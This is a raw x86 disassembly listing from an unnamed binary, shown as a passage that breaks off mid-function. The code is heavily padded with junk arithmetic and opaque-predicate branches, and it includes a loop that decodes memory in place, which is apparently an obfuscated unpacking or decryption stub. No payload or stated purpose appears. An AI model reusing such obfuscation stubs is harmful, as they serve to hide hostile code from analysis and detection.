  453c24:	mov    ebx,DWORD PTR [ebp-0x18]
  453c27:	sub    DWORD PTR [ebp-0x18],esi
  453c2a:	test   edx,0x23
  453c30:	jne    0x453cd1
  453c36:	sub    DWORD PTR [ebp-0x18],ebx
  453c39:	cmp    edx,eax
  453c3b:	jne    0x453cd1
  453c41:	mov    ebx,DWORD PTR [ebp-0x18]
  453c44:	cmp    edx,0x4440002c
  453c4a:	je     0x453cd1
  453c50:	cmp    ebx,0xffffffa2
  453c53:	jne    0x453cd1
  453c55:	mov    esi,DWORD PTR [ebp-0x18]
  453c58:	sub    DWORD PTR [ebp-0x18],ebx
  453c5b:	mov    ebx,0x9b
  453c60:	add    ebx,edx
  453c62:	add    ebx,esi
  453c64:	cmp    ebx,DWORD PTR ds:0x471cf4
  453c6a:	je     0x453cd1
  453c6c:	sub    DWORD PTR [ebp-0x18],ecx
  453c6f:	mov    edx,DWORD PTR [ebp-0x18]
  453c72:	cmp    edx,DWORD PTR [ebp-0x10]
  453c75:	jne    0x453cd1
  453c77:	mov    ecx,0x84
  453c7c:	mov    esi,0x58
  453c81:	and    DWORD PTR [ebp-0x18],ecx
  453c84:	sub    DWORD PTR [ebp-0x18],edi
  453c87:	cmp    ebx,DWORD PTR ds:0x471cf4
  453c8d:	je     0x453cd1
  453c8f:	sub    DWORD PTR [ebp-0x18],esi
  453c92:	cmp    edx,0x8d2c
  453c98:	jne    0x453cd1
  453c9a:	mov    ecx,0xc7
  453c9f:	cmp    ebx,DWORD PTR ds:0x471cf4
  453ca5:	jne    0x453cd1
  453ca7:	or     DWORD PTR [ebp-0x18],ebx
  453caa:	cmp    edx,DWORD PTR ds:0x471cf4
  453cb0:	je     0x453cd1
  453cb2:	add    edx,ecx
  453cb4:	cmp    edx,DWORD PTR [ebp-0x4]
  453cb7:	jne    0x453cd1
  453cb9:	cmp    edx,edi
  453cbb:	je     0x453cd1
  453cbd:	mov    ecx,DWORD PTR [ebp-0x18]
  453cc0:	add    ecx,edi
  453cc2:	sub    DWORD PTR [ebp-0x18],edx
  453cc5:	mov    edi,DWORD PTR ds:0x471cf4
  453ccb:	add    DWORD PTR [ebp-0x18],edi
  453cce:	sub    DWORD PTR [ebp-0x18],ecx
  453cd1:	mov    ebx,DWORD PTR [ebp-0x18]
  453cd4:	cmp    ebx,DWORD PTR ds:0x471cf4
  453cda:	jne    0x453d00
  453cdc:	mov    edx,0x7c58
  453ce1:	or     ebx,edi
  453ce3:	mov    ecx,DWORD PTR [ebp-0x18]
  453ce6:	sub    ecx,ebx
  453ce8:	mov    DWORD PTR [ebp-0x18],eax
  453ceb:	sub    DWORD PTR [ebp-0x18],ecx
  453cee:	add    edx,edi
  453cf0:	sub    edx,edi
  453cf2:	or     DWORD PTR [ebp-0x18],ebx
  453cf5:	or     edx,eax
  453cf7:	sub    edx,eax
  453cf9:	add    edx,eax
  453cfb:	sub    edx,eax
  453cfd:	add    DWORD PTR [ebp-0x18],edx
  453d00:	pop    edi
  453d01:	and    ecx,edx
  453d03:	mov    edx,DWORD PTR [ebp-0x18]
  453d06:	mov    esi,DWORD PTR [ebp-0x18]
  453d09:	cmp    esi,DWORD PTR [ebp-0x18]
  453d0c:	jne    0x453d43
  453d0e:	mov    ebx,DWORD PTR [ebp-0x18]
  453d11:	cmp    esi,0xffffff8b
  453d14:	jne    0x453d43
  453d16:	add    edx,ebx
  453d18:	mov    ebx,edi
  453d1a:	add    ecx,eax
  453d1c:	sub    esi,edi
  453d1e:	add    DWORD PTR [ebp-0x18],eax
  453d21:	and    esi,edi
  453d23:	sub    esi,edx
  453d25:	xor    DWORD PTR [ebp-0x18],ecx
  453d28:	sub    ebx,esi
  453d2a:	cmp    ebx,DWORD PTR ds:0x471cf4
  453d30:	jne    0x453d43
  453d32:	cmp    ebx,DWORD PTR [ebp-0x4]
  453d35:	jne    0x453d43
  453d37:	cmp    ebx,0x7b
  453d3a:	je     0x453d43
  453d3c:	add    ebx,ebx
  453d3e:	sub    ebx,eax
  453d40:	sub    DWORD PTR [ebp-0x18],ebx
  453d43:	pop    esi
  453d44:	test   esi,0x0
  453d4a:	jne    0x453dd3
  453d50:	cmp    esi,DWORD PTR ds:0x471cf4
  453d56:	jne    0x453dd3
  453d58:	mov    edx,DWORD PTR [ebp-0x18]
  453d5b:	mov    ecx,DWORD PTR [ebp-0x18]
  453d5e:	and    DWORD PTR [ebp-0x18],esi
  453d61:	sub    DWORD PTR [ebp-0x18],eax
  453d64:	sub    ecx,esi
  453d66:	or     ecx,eax
  453d68:	add    edx,edx
  453d6a:	test   ecx,0xfe88
  453d70:	je     0x453dd3
  453d72:	mov    ebx,DWORD PTR [ebp-0x18]
  453d75:	sub    ebx,esi
  453d77:	sub    DWORD PTR [ebp-0x18],edi
  453d7a:	cmp    edi,0xffffff89
  453d7d:	jne    0x453dd3
  453d7f:	sub    DWORD PTR [ebp-0x18],ecx
  453d82:	cmp    edx,0xffffffa9
  453d85:	je     0x453dd3
  453d87:	add    DWORD PTR [ebp-0x18],ebx
  453d8a:	sub    edx,esi
  453d8c:	cmp    edx,DWORD PTR ds:0x471cf4
  453d92:	je     0x453dd3
  453d94:	cmp    edx,DWORD PTR ds:0x471cf4
  453d9a:	jne    0x453dd3
  453d9c:	xor    ebx,ebx
  453d9e:	add    DWORD PTR [ebp-0x18],edx
  453da1:	mov    ecx,DWORD PTR [ebp-0x18]
  453da4:	add    ebx,edi
  453da6:	cmp    ecx,DWORD PTR [ebp-0x8]
  453da9:	je     0x453dd3
  453dab:	xor    DWORD PTR [ebp-0x18],ecx
  453dae:	mov    edx,0x8a
  453db3:	add    DWORD PTR [ebp-0x18],edx
  453db6:	mov    edx,0x43
  453dbb:	add    DWORD PTR [ebp-0x18],ebx
  453dbe:	cmp    esi,ecx
  453dc0:	je     0x453dd3
  453dc2:	sub    edx,eax
  453dc4:	mov    ecx,DWORD PTR [ebp-0x18]
  453dc7:	add    DWORD PTR [ebp-0x18],edx
  453dca:	mov    edx,DWORD PTR [ebp-0x18]
  453dcd:	add    DWORD PTR [ebp-0x18],ecx
  453dd0:	add    DWORD PTR [ebp-0x18],edx
  453dd3:	pop    ebx
  453dd4:	mov    ecx,DWORD PTR [ebp-0x18]
  453dd7:	mov    edx,DWORD PTR [ebp-0x18]
  453dda:	sub    ecx,edx
  453ddc:	cmp    edi,DWORD PTR [ebp-0x10]
  453ddf:	jne    0x453e0e
  453de1:	mov    edx,DWORD PTR ds:0x471cf4
  453de7:	add    DWORD PTR [ebp-0x18],ecx
  453dea:	cmp    ebx,0xffffffd2
  453ded:	jne    0x453e0e
  453def:	sub    edx,ebx
  453df1:	mov    ecx,eax
  453df3:	add    DWORD PTR [ebp-0x18],edi
  453df6:	cmp    edx,DWORD PTR [ebp-0x10]
  453df9:	je     0x453e0e
  453dfb:	add    edx,ecx
  453dfd:	mov    ecx,DWORD PTR [ebp-0x18]
  453e00:	or     ecx,eax
  453e02:	sub    DWORD PTR [ebp-0x18],ecx
  453e05:	add    edx,eax
  453e07:	add    edx,esi
  453e09:	sub    edx,ecx
  453e0b:	xor    DWORD PTR [ebp-0x18],edx
  453e0e:	leave  
  453e0f:	ret    
  453e10:	int3   
  453e11:	int3   
  453e12:	int3   
  453e13:	int3   
  453e14:	int3   
  453e15:	push   ebp
  453e16:	mov    ebp,esp
  453e18:	sub    esp,0x38
  453e1b:	mov    eax,0x1c
  453e20:	mov    DWORD PTR [ebp-0x34],eax
  453e23:	push   ebx
  453e24:	add    DWORD PTR [ebp-0x34],eax
  453e27:	push   esi
  453e28:	sub    DWORD PTR [ebp-0x34],eax
  453e2b:	push   edi
  453e2c:	xor    esi,esi
  453e2e:	mov    eax,DWORD PTR [ebp-0x34]
  453e31:	and    DWORD PTR [ebp-0x34],eax
  453e34:	cmp    eax,0xffffff81
  453e37:	jne    0x453e3e
  453e39:	mov    eax,esi
  453e3b:	sub    DWORD PTR [ebp-0x34],eax
  453e3e:	and    DWORD PTR [ebp-0x34],esi
  453e41:	mov    eax,DWORD PTR [ebp+0x10]
  453e44:	cmp    eax,0x9fe5
  453e49:	je     0x453e59
  453e4b:	mov    esi,DWORD PTR ds:0x471d70
  453e51:	mov    edi,eax
  453e53:	sub    DWORD PTR [ebp-0x34],esi
  453e56:	add    DWORD PTR [ebp-0x34],edi
  453e59:	mov    ecx,DWORD PTR [ebp+0x8]
  453e5c:	add    edi,eax
  453e5e:	mov    esi,0x99
  453e63:	add    esi,ecx
  453e65:	mov    ebx,DWORD PTR [ebp-0x34]
  453e68:	and    esi,edi
  453e6a:	add    ebx,esi
  453e6c:	sub    ebx,edi
  453e6e:	sub    ebx,ecx
  453e70:	cmp    ebx,eax
  453e72:	jne    0x453e99
  453e74:	mov    edx,DWORD PTR ds:0x471d54
  453e7a:	add    ebx,eax
  453e7c:	test   ebx,0x6d
  453e82:	je     0x453e99
  453e84:	sub    ebx,ecx
  453e86:	mov    esi,DWORD PTR [ebp-0x34]
  453e89:	mov    edi,DWORD PTR [ebp-0x34]
  453e8c:	add    DWORD PTR [ebp-0x34],edi
  453e8f:	add    ebx,eax
  453e91:	or     ebx,edx
  453e93:	sub    DWORD PTR [ebp-0x34],esi
  453e96:	add    DWORD PTR [ebp-0x34],ebx
  453e99:	cmp    DWORD PTR [ebp+0xc],eax
  453e9c:	je     0x453fbe
  453ea2:	sub    edx,eax
  453ea4:	mov    DWORD PTR [ebp-0x34],edx
  453ea7:	dec    DWORD PTR [ebp+0xc]
  453eaa:	mov    ebx,0x91
  453eaf:	mov    esi,DWORD PTR [ebp-0x34]
  453eb2:	sub    DWORD PTR [ebp-0x34],ebx
  453eb5:	sub    esi,ebx
  453eb7:	cmp    esi,DWORD PTR [ebp-0x28]
  453eba:	jne    0x453ec3
  453ebc:	add    esi,ecx
  453ebe:	or     esi,edi
  453ec0:	add    DWORD PTR [ebp-0x34],esi
  453ec3:	xor    DWORD PTR [ecx],eax
  453ec5:	mov    ebx,0xa62f
  453eca:	mov    esi,DWORD PTR [ebp-0x34]
  453ecd:	sub    DWORD PTR [ebp-0x34],ebx
  453ed0:	cmp    esi,0x970e
  453ed6:	je     0x453f39
  453ed8:	mov    ebx,DWORD PTR ds:0x471d68
  453ede:	add    esi,edx
  453ee0:	sub    ebx,edx
  453ee2:	test   esi,0x7911
  453ee8:	je     0x453f39
  453eea:	cmp    ebx,edi
  453eec:	jne    0x453f39
  453eee:	cmp    esi,ecx
  453ef0:	jne    0x453f39
  453ef2:	sub    DWORD PTR [ebp-0x34],esi
  453ef5:	mov    esi,DWORD PTR [ebp-0x34]
  453ef8:	cmp    esi,edx
  453efa:	je     0x453f39
  453efc:	sub    esi,edi
  453efe:	cmp    ebx,0x25
  453f01:	je     0x453f39
  453f03:	cmp    esi,eax
  453f05:	jne    0x453f39
  453f07:	add    ebx,eax
  453f09:	cmp    esi,ebx
  453f0b:	je     0x453f39
  453f0d:	add    DWORD PTR [ebp-0x34],ecx
  453f10:	or     ebx,eax
  453f12:	cmp    esi,DWORD PTR ds:0x471d70
  453f18:	jne    0x453f39
  453f1a:	add    ebx,ecx
  453f1c:	add    DWORD PTR [ebp-0x34],ebx
  453f1f:	cmp    esi,ebx
  453f21:	jne    0x453f39
  453f23:	test   esi,0x62db
  453f29:	jne    0x453f39
  453f2b:	mov    ebx,DWORD PTR ds:0x471d54
  453f31:	and    ebx,edx
  453f33:	add    DWORD PTR [ebp-0x34],esi
  453f36:	sub    DWORD PTR [ebp-0x34],ebx
  453f39:	rol    DWORD PTR [ecx],0x1f
  453f3c:	sub    DWORD PTR [ebp-0x34],ebx
  453f3f:	neg    DWORD PTR [ecx]
  453f41:	mov    esi,0x5c
  453f46:	mov    ebx,DWORD PTR ds:0x471d68
  453f4c:	cmp    edx,0x1fdd
  453f52:	jne    0x453f57
  453f54:	sub    DWORD PTR [ebp-0x34],ecx
  453f57:	sub    ebx,eax
  453f59:	add    DWORD PTR [ebp-0x34],ebx
  453f5c:	mov    DWORD PTR [ebp-0x34],edx
  453f5f:	add    DWORD PTR [ebp-0x34],esi
  453f62:	sub    DWORD PTR [ecx],0x5c1f45c1
  453f68:	mov    esi,DWORD PTR [ebp-0x34]
  453f6b:	cmp    ebx,0x1f
  453f6e:	je     0x453fa7
  453f70:	cmp    esi,0x8
  453f73:	jne    0x453fa7
  453f75:	sub    DWORD PTR [ebp-0x34],eax
  453f78:	sub    esi,ecx
  453f7a:	mov    ebx,DWORD PTR [ebp-0x34]
  453f7d:	cmp    ecx,DWORD PTR ds:0x471d68
  453f83:	je     0x453fa7
  453f85:	cmp    esi,0x7
  453f88:	jne    0x453fa7
  453f8a:	or     DWORD PTR [ebp-0x34],esi
  453f8d:	sub    ebx,edi
  453f8f:	test   ebx,0xe6
  453f95:	jne    0x453fa7
  453f97:	and    ebx,esi
  453f99:	mov    esi,DWORD PTR [ebp-0x34]
  453f9c:	cmp    esi,0xffffff9f
  453f9f:	je     0x453fa7
  453fa1:	mov    DWORD PTR [ebp-0x34],esi
  453fa4:	add    DWORD PTR [ebp-0x34],ebx
  453fa7:	add    ecx,0x4
  453faa:	cmp    ecx,0xffffffc9
  453fad:	je     0x453fb9
  453faf:	mov    esi,DWORD PTR [ebp-0x34]
  453fb2:	mov    ebx,edi
  453fb4:	sub    esi,ebx
  453fb6:	sub    DWORD PTR [ebp-0x34],esi
  453fb9:	jmp    0x453e5c
  453fbe:	sub    DWORD PTR [ebp-0x34],eax
  453fc1:	mov    ebx,DWORD PTR [ebp-0x34]
  453fc4:	mov    DWORD PTR [ebp-0x34],ebx
  453fc7:	sub    DWORD PTR [ebp-0x34],ebx
  453fca:	pop    edi
  453fcb:	add    ebx,edi
  453fcd:	mov    edx,0x33
  453fd2:	add    ebx,edx
  453fd4:	mov    edx,0x5f
  453fd9:	sub    DWORD PTR [ebp-0x34],ebx
  453fdc:	add    edx,edi
  453fde:	test   edx,0x487
  453fe4:	je     0x454016
  453fe6:	and    edx,edi
  453fe8:	xor    ebx,ebx
  453fea:	mov    eax,DWORD PTR [ebp-0x34]
  453fed:	add    DWORD PTR [ebp-0x34],edx
  453ff0:	test   eax,0xd9
  453ff5:	je     0x454016
  453ff7:	sub    eax,ebx
  453ff9:	add    eax,edi
  453ffb:	test   eax,0x82
  454000:	je     0x454016
  454002:	mov    ebx,DWORD PTR [ebp-0x34]
  454005:	mov    esi,DWORD PTR [ebp-0x34]
  454008:	sub    DWORD PTR [ebp-0x34],esi
  45400b:	add    DWORD PTR [ebp-0x34],ebx
  45400e:	cmp    edi,0x1
  454011:	je     0x454016
  454013:	xor    DWORD PTR [ebp-0x34],eax
  454016:	pop    esi
  454017:	cmp    esi,DWORD PTR ds:0x471d70
  45401d:	je     0x454045
  45401f:	add    eax,esi
  454021:	mov    ecx,0xa9
  454026:	add    ecx,eax
  454028:	cmp    eax,DWORD PTR ds:0x471d54
  45402e:	je     0x454045
  454030:	cmp    ecx,0xffffffc5
  454033:	je     0x454045
  454035:	mov    edx,DWORD PTR [ebp-0x34]
  454038:	or     edx,edi
  45403a:	mov    eax,DWORD PTR [ebp-0x34]
  45403d:	sub    ecx,edx
  45403f:	add    DWORD PTR [ebp-0x34],eax
  454042:	add    DWORD PTR [ebp-0x34],ecx
  454045:	pop    ebx
  454046:	mov    eax,DWORD PTR [ebp-0x34]
  454049:	test   ebx,0x21
  45404f:	jne    0x454080
  454051:	cmp    eax,0xffffffba
  454054:	je     0x454080
  454056:	add    DWORD PTR [ebp-0x34],edi
  454059:	xor    edx,edx
  45405b:	xor    ecx,ecx
  45405d:	xor    DWORD PTR [ebp-0x34],ecx
  454060:	add    eax,ebx
  454062:	cmp    eax,0xffffffcb
  454065:	je     0x454080
  454067:	add    DWORD PTR [ebp-0x34],edx
  45406a:	mov    edx,0x10
  45406f:	or     DWORD PTR [ebp-0x34],eax
  454072:	mov    ecx,DWORD PTR [ebp-0x34]
  454075:	add    edx,edx
  454077:	sub    ecx,edx
  454079:	and    ecx,esi
  45407b:	sub    ecx,edi
  45407d:	sub    DWORD PTR [ebp-0x34],ecx
  454080:	leave  
  454081:	ret    0xc
  454084:	int3   
  454085:	int3   
  454086:	int3   
  454087:	int3   
  454088:	int3   
  454089:	push   ebp
  45408a:	mov    ebp,esp
  45408c:	sub    esp,0x50
  45408f:	xor    eax,eax
  454091:	xor    ecx,ecx
  454093:	mov    DWORD PTR [ebp-0x4c],eax
  454096:	sub    DWORD PTR [ebp-0x4c],ecx
  454099:	push   ebx
  45409a:	mov    ecx,DWORD PTR [ebp-0x4c]
  45409d:	mov    ebx,DWORD PTR [ebp-0x4c]
  4540a0:	test   ecx,0x16
  4540a6:	je     0x4541b0
  4540ac:	mov    eax,0xfd
  4540b1:	cmp    ecx,DWORD PTR [ebp-0x8]
  4540b4:	je     0x4541b0
  4540ba:	add    ebx,eax
  4540bc:	mov    edx,DWORD PTR [ebp-0x4c]
  4540bf:	add    edx,eax
  4540c1:	mov    eax,DWORD PTR [ebp-0x4c]
  4540c4:	add    eax,ecx
  4540c6:	add    DWORD PTR [ebp-0x4c],edx
  4540c9:	test   eax,0xf
  4540ce:	je     0x4541b0
  4540d4:	mov    ecx,DWORD PTR [ebp-0x4c]
  4540d7:	sub    DWORD PTR [ebp-0x4c],edx
  4540da:	mov    edx,DWORD PTR [ebp-0x4c]
  4540dd:	and    DWORD PTR [ebp-0x4c],ebx
  4540e0:	cmp    ecx,DWORD PTR [ebp-0x40]
  4540e3:	jne    0x4541b0
  4540e9:	mov    ebx,DWORD PTR [ebp-0x4c]
  4540ec:	add    ecx,eax
  4540ee:	mov    eax,DWORD PTR [ebp-0x4c]
  4540f1:	cmp    ecx,eax
  4540f3:	jne    0x4541b0
  4540f9:	add    DWORD PTR [ebp-0x4c],ebx
  4540fc:	test   eax,0x9a
  454101:	je     0x4541b0
  454107:	mov    ebx,DWORD PTR [ebp-0x4c]
  45410a:	and    ecx,ebx
  45410c:	or     DWORD PTR [ebp-0x4c],eax
  45410f:	and    ecx,ebx
  454111:	add    DWORD PTR [ebp-0x4c],eax
  454114:	add    DWORD PTR [ebp-0x4c],ecx
  454117:	cmp    edx,0x3c
  45411a:	je     0x4541b0
  454120:	mov    eax,0x3e
  454125:	mov    ebx,DWORD PTR [ebp-0x4c]
  454128:	and    ebx,ecx
  45412a:	add    eax,ecx
  45412c:	sub    DWORD PTR [ebp-0x4c],edx
  45412f:	add    DWORD PTR [ebp-0x4c],ecx
  454132:	cmp    ebx,0xffffffe0
  454135:	jne    0x4541b0
  454137:	mov    ecx,DWORD PTR [ebp-0x4c]
  45413a:	or     DWORD PTR [ebp-0x4c],ecx
  45413d:	sub    DWORD PTR [ebp-0x4c],edx
  454140:	add    ebx,ebx
  454142:	cmp    eax,DWORD PTR [ebp-0x50]
  454145:	je     0x4541b0
  454147:	mov    ecx,eax
  454149:	sub    DWORD PTR [ebp-0x4c],ecx
  45414c:	sub    ebx,ecx
  45414e:	xor    edx,edx
  454150:	and    edx,eax
  454152:	test   ebx,0xe2
  454158:	jne    0x4541b0
  45415a:	xor    eax,eax
  45415c:	add    DWORD PTR [ebp-0x4c],ebx
  45415f:	mov    ecx,0x40308a5
  454164:	test   edx,0x76
  45416a:	je     0x4541b0
  45416c:	mov    ebx,0xc8
  454171:	mov    DWORD PTR [ebp-0xc],eax
  454174:	add    ebx,ebx
  454176:	sub    edx,ecx
  454178:	mov    ecx,DWORD PTR [ebp-0x4c]
  45417b:	add    ebx,ecx
  45417d:	sub    DWORD PTR [ebp-0x4c],edx
  454180:	sub    ebx,ecx
  454182:	cmp    ebx,0x51
  454185:	je     0x4541b0
  454187:	and    DWORD PTR [ebp-0xc],eax
  45418a:	mov    ecx,DWORD PTR ds:0x471d04
  454190:	add    DWORD PTR [ebp-0xc],ebx
  454193:	mov    edx,0x16
  454198:	sub    edx,ebx
  45419a:	add    ecx,ebx
  45419c:	cmp    edx,ebx
  45419e:	je     0x4541b0
  4541a0:	add    DWORD PTR [ebp-0x4c],ecx
  4541a3:	mov    ecx,eax
  4541a5:	sub    DWORD PTR [ebp-0x4c],edx
  4541a8:	sub    eax,edx
  4541aa:	add    DWORD PTR [ebp-0x4c],ecx
  4541ad:	add    DWORD PTR [ebp-0x4c],eax
  4541b0:	push   esi
  4541b1:	sub    ebx,edx
  4541b3:	xor    ecx,ecx
  4541b5:	sub    DWORD PTR [ebp-0x4c],ebx
  4541b8:	xor    ebx,ebx
  4541ba:	add    ebx,edx
  4541bc:	cmp    eax,0xe4c
  4541c1:	jne    0x454237
  4541c3:	sub    ecx,ebx
  4541c5:	xor    ebx,ebx
  4541c7:	cmp    ecx,DWORD PTR ds:0x471d04
  4541cd:	jne    0x454237
  4541cf:	sub    ecx,eax
  4541d1:	mov    edx,0x38
  4541d6:	mov    eax,DWORD PTR [ebp-0x4c]
  4541d9:	cmp    ecx,DWORD PTR [ebp-0x3c]
  4541dc:	je     0x454237
  4541de:	cmp    ecx,0x4f
  4541e1:	je     0x454237
  4541e3:	mov    esi,DWORD PTR [ebp-0x4c]
  4541e6:	add    ecx,ecx
  4541e8:	sub    DWORD PTR [ebp-0x4c],ecx
  4541eb:	sub    DWORD PTR [ebp-0x4c],esi
  4541ee:	sub    ebx,edx
  4541f0:	xor    DWORD PTR [ebp-0x4c],ebx
  4541f3:	cmp    eax,DWORD PTR ds:0x471d04
  4541f9:	je     0x454237
  4541fb:	mov    edx,0xaf
  454200:	mov    ecx,DWORD PTR [ebp-0x4c]
  454203:	add    edx,ebx
  454205:	sub    DWORD PTR [ebp-0x4c],edx
  454208:	cmp    ecx,ebx
  45420a:	je     0x454237
  45420c:	sub    eax,esi
  45420e:	xor    esi,esi
  454210:	mov    edx,eax
  454212:	add    edx,ebx
  454214:	add    DWORD PTR [ebp-0x4c],ecx
  454217:	test   ecx,0xb9
  45421d:	jne    0x454237
  45421f:	xor    DWORD PTR [ebp-0x4c],esi
  454222:	mov    eax,DWORD PTR [ebp-0x4c]
  454225:	sub    edx,esi
  454227:	cmp    ecx,DWORD PTR [ebp-0x30]
  45422a:	je     0x454237
  45422c:	cmp    edx,eax
  45422e:	jne    0x454237
  454230:	and    eax,edx
  454232:	and    eax,ebx
  454234:	sub    DWORD PTR [ebp-0x4c],eax
  454237:	push   edi
  454238:	mov    ebx,DWORD PTR [ebp-0x4c]
  45423b:	cmp    ebx,esi
  45423d:	je     0x454244
  45423f:	mov    eax,ebx
  454241:	add    DWORD PTR [ebp-0x4c],eax
  454244:	cmp    eax,edx
  454246:	jne    0x45424b
  454248:	sub    DWORD PTR [ebp-0x4c],ebx
  45424b:	mov    ecx,0x8b1fafa0
  454250:	mov    edi,0xfc
  454255:	mov    edx,DWORD PTR [ebp-0x4c]
  454258:	cmp    edx,DWORD PTR ds:0x471d04
  45425e:	jne    0x4542c7
  454260:	xor    eax,eax
  454262:	add    DWORD PTR [ebp-0x4c],ecx
  454265:	cmp    ebx,DWORD PTR ds:0x471d04
  45426b:	jne    0x4542c7
  45426d:	or     edx,eax
  45426f:	mov    eax,ebx
  454271:	add    edi,edi
  454273:	add    edx,ebx
  454275:	and    eax,esi
  454277:	add    DWORD PTR [ebp-0x4c],eax
  45427a:	mov    esi,DWORD PTR ds:0x471d04
  454280:	test   edx,0x9b
  454286:	jne    0x4542c7
  454288:	xor    ebx,ebx
  45428a:	mov    eax,0xc2
  45428f:	add    DWORD PTR [ebp-0x4c],ebx
  454292:	sub    edx,ecx
  454294:	test   edx,0xcc
  45429a:	je     0x4542c7
  45429c:	sub    edx,ebx
  45429e:	sub    DWORD PTR [ebp-0x4c],ebx
  4542a1:	mov    ebx,0x13
  4542a6:	mov    DWORD PTR [ebp-0x4c],ebx
  4542a9:	mov    ebx,DWORD PTR [ebp-0x4c]
  4542ac:	sub    DWORD PTR [ebp-0x4c],edx
  4542af:	mov    DWORD PTR [ebp-0x4c],esi
  4542b2:	add    ebx,ebx
  4542b4:	xor    DWORD PTR [ebp-0x4c],ebx
  4542b7:	mov    DWORD PTR [ebp-0x4c],edi
  4542ba:	sub    DWORD PTR [ebp-0x4c],ecx
  4542bd:	cmp    edx,0xa
  4542c0:	je     0x4542c7
  4542c2:	or     eax,edi
  4542c4:	sub    DWORD PTR [ebp-0x4c],eax
  4542c7:	sub    ecx,0x8b1faf60
  4542cd:	mov    esi,DWORD PTR [ebp-0x4c]
  4542d0:	mov    edx,DWORD PTR [ebp-0x4c]
  4542d3:	add    DWORD PTR [ebp-0x4c],edx
  4542d6:	cmp    edx,esi
  4542d8:	jne    0x4542df
  4542da:	add    esi,ecx
  4542dc:	xor    DWORD PTR [ebp-0x4c],esi
  4542df:	push   ecx
  4542e0:	add    esi,edx
  4542e2:	mov    edx,0xac
  4542e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4542ea:	sub    DWORD PTR [ebp-0x4c],eax
  4542ed:	add    edx,esi
  4542ef:	sub    DWORD PTR [ebp-0x4c],edx
  4542f2:	mov    ebx,0x63e1a4dd
  4542f7:	sub    ecx,ebx
  4542f9:	mov    esi,DWORD PTR [ebp-0x4c]
  4542fc:	mov    edx,DWORD PTR [ebp-0x4c]
  4542ff:	cmp    edx,edi
  454301:	je     0x45432b
  454303:	mov    DWORD PTR [ebp-0x4c],esi
  454306:	cmp    edx,0x75
  454309:	jne    0x45432b
  45430b:	xor    DWORD PTR [ebp-0x4c],edx
  45430e:	mov    edi,0xd4
  454313:	mov    eax,DWORD PTR ds:0x471d04
  454319:	or     edi,eax
  45431b:	sub    edi,ebx
  45431d:	cmp    esi,DWORD PTR ds:0x471d04
  454323:	jne    0x454328
  454325:	xor    DWORD PTR [ebp-0x4c],edi
  454328:	add    DWORD PTR [ebp-0x4c],ecx
  45432b:	add    ebx,0x9c1e6b23
  454331:	add    ecx,edx
  454333:	mov    eax,DWORD PTR [ebp-0x4c]
  454336:	mov    edi,DWORD PTR [ebp-0x4c]
  454339:	add    eax,ecx
  45433b:	sub    edi,eax
  45433d:	add    DWORD PTR [ebp-0x4c],ebx
  454340:	sub    DWORD PTR [ebp-0x4c],edx
  454343:	mov    DWORD PTR [ebp-0x4c],edi
  454346:	push   ebx
  454347:	add    edi,edi
  454349:	mov    eax,DWORD PTR [ebp-0x4c]
  45434c:	mov    esi,0xb7
  454351:	add    esi,ebx
  454353:	add    DWORD PTR [ebp-0x4c],esi
  454356:	add    edi,ebx
  454358:	test   ecx,0x400a192
  45435e:	je     0x4543ba
  454360:	sub    edi,edx
  454362:	xor    esi,esi
  454364:	cmp    eax,DWORD PTR [ebp-0x40]
  454367:	je     0x4543ba
  454369:	and    esi,edi
  45436b:	mov    ecx,0x8bf
  454370:	sub    DWORD PTR [ebp-0x4c],eax
  454373:	mov    edi,DWORD PTR [ebp-0x4c]
  454376:	test   edi,0x4d
  45437c:	jne    0x4543ba
  45437e:	add    ecx,eax
  454380:	mov    eax,DWORD PTR ds:0x471cdc
  454386:	add    DWORD PTR [ebp-0x4c],esi
  454389:	or     DWORD PTR [ebp-0x4c],eax
  45438c:	add    ecx,esi
  45438e:	mov    eax,DWORD PTR [ebp-0x4c]
  454391:	cmp    edi,esi
  454393:	jne    0x4543ba
  454395:	sub    DWORD PTR [ebp-0x4c],eax
  454398:	mov    esi,DWORD PTR [ebp-0x4c]
  45439b:	mov    edx,DWORD PTR [ebp-0x4c]
  45439e:	or     DWORD PTR [ebp-0x4c],ebx
  4543a1:	cmp    ecx,eax
  4543a3:	je     0x4543ba
  4543a5:	mov    eax,0x67
  4543aa:	sub    edi,eax
  4543ac:	mov    ebx,eax
  4543ae:	add    ecx,edx
  4543b0:	sub    esi,edi
  4543b2:	and    esi,ebx
  4543b4:	add    DWORD PTR [ebp-0x4c],ecx
  4543b7:	add    DWORD PTR [ebp-0x4c],esi
  4543ba:	push   0x68cea
  4543bf:	mov    ebx,0x1f
  4543c4:	mov    ecx,DWORD PTR [ebp-0x4c]
  4543c7:	and    DWORD PTR [ebp-0x4c],ecx
  4543ca:	and    ebx,edx
  4543cc:	and    DWORD PTR [ebp-0x4c],ecx
  4543cf:	sub    ebx,ecx
  4543d1:	mov    DWORD PTR [ebp-0x4c],ebx
  4543d4:	push   0x0
  4543d6:	xor    DWORD PTR [ebp-0x4c],ecx
  4543d9:	mov    ebx,0x583dd2cc
  4543de:	mov    ecx,0x2012648e
  4543e3:	sub    DWORD PTR [ebp-0x4c],edi
  4543e6:	mov    eax,edx
  4543e8:	sub    DWORD PTR [ebp-0x4c],ecx
  4543eb:	cmp    eax,0x5bb2
  4543f0:	jne    0x454535
  4543f6:	or     eax,edi
  4543f8:	cmp    eax,DWORD PTR ds:0x471d04
  4543fe:	je     0x454535
  454404:	mov    edx,DWORD PTR [ebp-0x4c]
  454407:	mov    edi,0x2ec0
  45440c:	cmp    eax,DWORD PTR ds:0x471cdc
  454412:	jne    0x454535
  454418:	mov    esi,0x28804050
  45441d:	mov    edi,DWORD PTR [ebp-0x4c]
  454420:	cmp    edi,DWORD PTR ds:0x471cdc
  454426:	je     0x454535
  45442c:	mov    DWORD PTR [ebp-0x4c],ebx
  45442f:	test   edi,0xb6
  454435:	je     0x454535
  45443b:	cmp    edi,DWORD PTR ds:0x471cdc
  454441:	jne    0x454535
  454447:	add    edx,edx
  454449:	cmp    eax,0x804d
  45444e:	jne    0x454535
  454454:	add    DWORD PTR [ebp-0x4c],edx
  454457:	cmp    eax,DWORD PTR ds:0x471cdc
  45445d:	je     0x454535
  454463:	or     edi,ecx
  454465:	mov    esi,DWORD PTR [ebp-0x4c]
  454468:	mov    ecx,DWORD PTR ds:0x471d04
  45446e:	sub    DWORD PTR [ebp-0x4c],edi
  454471:	cmp    esi,ebx
  454473:	jne    0x454535
  454479:	cmp    eax,esi
  45447b:	jne    0x454535
  454481:	mov    edx,esi
